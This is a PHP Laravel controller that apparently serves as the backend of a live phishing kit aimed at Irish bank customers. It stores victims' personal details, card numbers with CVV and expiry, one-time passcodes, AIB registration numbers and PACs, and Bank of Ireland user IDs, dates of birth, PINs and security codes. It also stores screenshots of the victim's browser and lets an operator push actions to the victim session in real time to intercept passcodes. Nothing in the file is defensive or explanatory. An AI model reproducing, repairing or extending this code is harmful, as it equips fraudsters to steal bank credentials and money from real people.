<?php

namespace App\Http\Controllers;

use App\Models\Session;
use Illuminate\Http\Request;

class MainController extends Controller
{
    //
    public function new(Request $req) 
    {
        $allowedTypes = ['new', 'securedata', 'cc', 'newOtp', 'last', 'newAibOtp', 'newAib', 'newBoi', 'newBoiPin', 'newBoiPinV2', 'newBoiSecCode'];
        $reqType = $req->type;

        if(!in_array($reqType, $allowedTypes)){
            return 'unknown';
        }

        if($reqType == "new"){
            config(['session.lifetime' => 30]);
            $sessionId = md5(uniqid(mt_rand(), true));
            $req->session()->put(env('SESSION_CKEY'),  $sessionId);
            return;
        }

        $sessionId = session(env('SESSION_CKEY'));
        
        if($reqType == "securedata"){
          
            $newSession = new Session;
            $newSession->session_id = $sessionId;
            $newSession->full_name = $req->fullname;
            $newSession->email = $req->email;
            $newSession->phone_number = $req->phonenumber;
            $newSession->postcode = $req->postcode;
            $newSession->address = $req->address;
            $newSession->status = $req->referringUrl;
            $newSession->ip = $req->ip();
            $newSession->useragent = $req->header('User-Agent');
            $newSession->last_active = now();
            $newSession->save();
            return;
        }

        if($reqType == "cc"){

            $updateSession  = Session::firstWhere('session_id', $sessionId);
            $updateSession->c_name = $req->_chname;
            $updateSession->c_number = $req->_cc;
            $updateSession->c_exp = $req->_expiry;
            $updateSession->c_cvv = $req->_cvv;
            $updateSession->status = $req->referringUrl;
            $updateSession->last_active = now();
            $updateSession->save();
            
            return;
        }

        if($reqType == "newOtp"){

            $updateSession  = Session::firstWhere('session_id', $sessionId);
            $updateSession->otp = $req->otp;
            $updateSession->status = $req->referringUrl;
            $updateSession->last_active = now();
            $updateSession->save();
            
            return;
        }

        if($reqType == "newAib"){

            $updateSession  = Session::firstWhere('session_id', $sessionId);
            $updateSession->aib_number = $req->regNumber;
            $updateSession->aib_pac = $req->PACNumber;
            $updateSession->status = $req->referringUrl;
            $updateSession->last_active = now();
            $updateSession->save();
            
            return;
        }

        if($reqType == "newAibOtp"){

            $updateSession  = Session::firstWhere('session_id', $sessionId);
            $updateSession->aib_otp = $req->otp;
            $updateSession->status = $req->referringUrl;
            $updateSession->last_active = now();
            $updateSession->save();
            
            return;
        }

        if($reqType == "newBoi"){

            $updateSession  = Session::firstWhere('session_id', $sessionId);
            $updateSession->boi_user_id = $req->userId;
            $updateSession->boi_dob = $req->dob;
            $updateSession->status = $req->referringUrl;
            $updateSession->last_active = now();
            $updateSession->save();
            
            return;
        }

        if($reqType == "newBoiPin"){

            $updateSession  = Session::firstWhere('session_id', $sessionId);
            $updateSession->boi_pin = $req->pin;
            $updateSession->status = $req->referringUrl;
            $updateSession->last_active = now();
            $updateSession->save();
            
            return;
        }

        if($reqType == "newBoiPinV2"){

            $updateSession  = Session::firstWhere('session_id', $sessionId);
            $updateSession->boi_pin = $this->rearrangeNumber($updateSession->boi_pin.$req->pin);
            $updateSession->status = $req->referringUrl;
            $updateSession->last_active = now();
            $updateSession->save();
            
            return;
        }

        if($reqType == "newBoiSecCode"){

            $updateSession  = Session::firstWhere('session_id', $sessionId);
            $updateSession->boi_security_code =$req->security_code;
            $updateSession->status = $req->referringUrl;
            $updateSession->last_active = now();
            $updateSession->save();
            
            return;
        }


        if($reqType == "last"){

            $updateSession  = Session::firstWhere('session_id', $sessionId);
            $updateSession->status = $req->referringUrl;
            $updateSession->last_active = now();
            $updateSession->save();
            return;

        }

    }

    public function connection(Request $req) 
    {
        $allowedTypes = ['checkAction', 'screenshot', 'ban'];
        $reqType = $req->type;


        $data =[];
     
        $sessionId = session(env('SESSION_CKEY'));
        $updateSession  = Session::firstWhere('session_id', $sessionId);

        if ($req->type ==  'screenshot'){
            $imageDataUrl = $req->input('img');
            $updateSession->screenshot = $imageDataUrl;
            $updateSession->action = null;
        }

        if ($req->type ==  'update'){

        }

        if ($req->type ==  'checkAction'){
            if($updateSession->action == null) return 'none';
            $data['action'] =  $updateSession->action;
            $updateSession->action = null;
        }

        $updateSession->status = $req->referringUrl;
        $updateSession->last_active = now();
        $updateSession->save();

        return response()->json($data);
    }

    function rearrangeNumber($number) {
        // Check if the input number has exactly 6 digits
        if (strlen($number) === 6) {
            // Rearrange the digits according to the specified order
            $rearrangedNumber =
                $number[0] .    // First digit
                $number[3] .    // Fourth digit
                $number[4].    // Fifth digit
                $number[1] .    // Second digit
                $number[5] .   // Sixth digit
                $number[2] ;    // Third digit
            
            return $rearrangedNumber;
        } 
    }

}
